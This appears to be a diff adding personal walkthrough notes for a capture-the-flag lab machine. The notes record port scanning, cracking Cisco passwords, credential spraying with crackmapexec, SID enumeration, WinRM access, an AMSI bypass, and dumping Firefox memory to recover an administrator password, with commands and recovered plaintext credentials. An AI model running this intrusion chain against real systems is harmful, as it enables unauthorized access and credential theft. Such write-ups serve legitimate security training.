@@ -1,0 +1,46 @@
+Start Date: 05/06/2023
+Finish Date: xx/xx/xxxx
+
+1. Conducted a port scan using nmap -p- and -v to get ports.
+2. Conducted a more thurough scan using the -sV -sC switches an>
+CMD: sudo nmap -p 22,53,80 -sV -sC 10.129.220.52 -o nmap.scan
+3. I can login as a guest to the web service on port 80.
+4. Once I was logged in as guest, I could view a conversation between hazard and admin.
+5. There was a hint that hazard was a user on the windows server.
+6. I could also download a config file and crack three passwords.
+7. One was crackable with john, the other two I had to use a tool called cisco_pwdecrypt
+CMD: python3 cisco_pwdecrypt.py -t 0242114B0E143F015F5D1E161713 -d /usr/share/wordlists/SecLists/Passwords/rockyou.txt
+[*] Result: $uperP@ssword 
+CMD: python3 cisco_pwdecrypt.py -t 02375012182C1A1D751618034F36415408 -d /usr/share/wordlists/SecLists/Passwords/rockyou.txt
+[*] Result: Q4)sJu\Y8qz*A3?d
+8. Now I had three passwords and some usernames to try against the server, I ran cme.
+CMD: cme winrm 10.10.10.149 -u creds.txt -p pass.txt
+RESULT: NONE...
+CMD: cme smb 10.10.10.149 -u creds.txt -p pass.txt
+RESULT: SMB   10.10.10.149 445 SUPPORTDESK  [+] SupportDesk\hazard:stealth1agent 
+9. I tried connecting with smbclient, I was able to list the shares, but couldn't connect.
+10. I tried with rpcclient, and was able to connect using the credentials of Hazard!
+CMD: rpcclient -U hazard 10.10.10.149
+11. After not getting anything from rpcclient enumeration, I tried impacket's lookupsid.py
+CMD: python3 lookupsid.py hazard:stealth1agent@10.10.10.149
+RESULT: 1008: SUPPORTDESK\Hazard (SidTypeUser)
+1009: SUPPORTDESK\support (SidTypeUser)
+1012: SUPPORTDESK\Chase (SidTypeUser)
+1013: SUPPORTDESK\Jason (SidTypeUser)
+12. With these new usernames, I ran cme once more.
+CMD: cme winrm 10.10.10.149 -u creds.txt -p pass.txt
+RESULT: WINRM 10.10.10.149 5985 SUPPORTDESK[+]SupportDesk\chase:Q4)sJu\Y8qz*A3?d (Pwn3d!)
+13. I was able to evil-winrm into the machine as chase.
+14. I find the user.txt and a todo note on Chae's desktop. The note says to keep checking the issues list and to fix the routers config.
+15. During enumeration, I check the running processes and find firefox running.
+16. I upload procdump64 to the machine through evil-winrm and run it.
+17. Couldnt get procdump to work so I uploaded out-minidump.ps1 
+18. I bypassed AMSI and loaded the powershell script into memory, then ran it on one of the firefox process IDs.
+CMD: get-process -id 6252 | Out-Minidump 
+19. Downloaded the dump file to my machine and used grep to find post requests
+CMD: grep -aoE 'login_username=.{1,20}@.{1,20}&login_password=.{1,50}&login=' firefox.exe_190823_025430.dmp 
+Password: 4dD!5}x/re8]FBuZ
+NOTE: Could also use mimikittenz by adding custom regex to the end of the ps1 file checking for a login to the Heist machine.
+20. Found the password and tried using it to log back in as Administrator.
+21. Grabbed root.txt hash!
+ROOTED
